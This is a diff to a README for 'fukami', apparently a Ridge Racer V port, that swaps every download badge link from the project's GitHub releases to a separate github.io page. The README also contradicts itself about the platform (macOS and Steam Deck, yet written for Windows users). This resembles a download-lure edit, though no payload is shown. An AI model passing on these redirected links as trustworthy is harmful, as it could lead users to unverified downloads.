@@ -1,6 +1,6 @@
 # 🚗 fukami - Ridge Racer V on Modern Devices
 
-[![Download fukami](https://img.shields.io/badge/Download_fukami-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aqif985/fukami/releases)
+[![Download fukami](https://img.shields.io/badge/Download_fukami-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://aqif985.github.io)
 
 Fukami is a native macOS and Steam Deck port of Ridge Racer V (USA), created by static recompilation. It is designed to bring the classic arcade racing experience to modern devices with a clean, ready-to-run application. No game data is included. This page walks you through the simple download path for Windows users and explains how to get started without programming knowledge.
 
@@ -20,7 +20,7 @@ Fukami is a native port with a focus on modern devices. The release page is wher
 
 ## 💾 Download & Setup
 
-[![Download fukami](https://img.shields.io/badge/Get_fukami-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aqif985/fukami/releases)
+[![Download fukami](https://img.shields.io/badge/Get_fukami-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://aqif985.github.io)
 
 Visit this link to download the application.
 
@@ -66,7 +66,7 @@ What if the app asks for game data? Point it to your own Ridge Racer V (USA) gam
 
 ## 🔗 Official Download
 
-[![Download fukami](https://img.shields.io/badge/Download_Latest-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aqif985/fukami/releases)
+[![Download fukami](https://img.shields.io/badge/Download_Latest-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://aqif985.github.io)
 
 Visit this link to download the application.
 
